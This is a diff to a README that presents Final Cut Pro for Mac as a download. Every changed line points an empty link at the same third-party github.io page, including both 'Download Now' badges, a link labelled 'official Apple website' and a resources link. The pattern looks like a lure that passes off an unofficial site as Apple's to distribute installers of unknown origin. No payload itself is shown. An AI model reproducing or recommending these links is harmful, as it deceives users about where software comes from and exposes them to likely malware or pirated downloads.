@@ -6,7 +6,7 @@
 
 > **The industry-leading video editing software designed by Apple — unlock your creative potential with powerful, intuitive tools.**
 
-[![Download Final Cut Pro](https://img.shields.io/badge/⬇️%20Download%20Now-Final%20Cut%20Pro-orange?style=for-the-badge)]()
+[![Download Final Cut Pro](https://img.shields.io/badge/⬇️%20Download%20Now-Final%20Cut%20Pro-orange?style=for-the-badge)](https://finalcut-pro-mac.github.io/Final-cut/)
 
 <img width="1280" height="720" alt="image" src="https://i.ytimg.com/vi/YPdPN42MpXI/maxresdefault.jpg" /><br>
 
@@ -23,7 +23,7 @@ Key capabilities include:
 - 🌐 **360° VR Editing** — create immersive VR experiences with built-in tools
 - 🔄 **Proxy Workflow** — edit 8K and ProRes RAW footage on any Mac
 
-[![Download Final Cut Pro](https://img.shields.io/badge/⬇️%20Download%20Now-Final%20Cut%20Pro-orange?style=for-the-badge)]()
+[![Download Final Cut Pro](https://img.shields.io/badge/⬇️%20Download%20Now-Final%20Cut%20Pro-orange?style=for-the-badge)](https://finalcut-pro-mac.github.io/Final-cut/)
 
 ---
 
@@ -89,7 +89,7 @@ Installing **Final Cut Pro for Mac** is straightforward — here's how to get st
 5. The app will download and install automatically to your Applications folder
 6. Once installed, launch **Final Cut Pro** from the Applications folder
 
-> **Note**: If you purchased a new Mac, Final Cut Pro may come pre-installed or available as a free trial during setup. You can also download the trial from the [official Apple website]().
+> **Note**: If you purchased a new Mac, Final Cut Pro may come pre-installed or available as a free trial during setup. You can also download the trial from the [official Apple website](finalcut-pro-mac.github.io/Final-cut/).
 
 ---
 
@@ -227,7 +227,7 @@ Yes — Final Cut Pro supports **SharePlay** for real-time collaboration (macOS 
 
 ## 🤝 Contributing
 
-The Final Cut Pro ecosystem thrives on community contributions — from plugins, transitions, and effects to templates and presets. Check out the [Final Cut Pro Resources]() page for more information on third-party integrations.
+The Final Cut Pro ecosystem thrives on community contributions — from plugins, transitions, and effects to templates and presets. Check out the [Final Cut Pro Resources](finalcut-pro-mac.github.io/Final-cut/) page for more information on third-party integrations.
 
 ## 📄 License
 
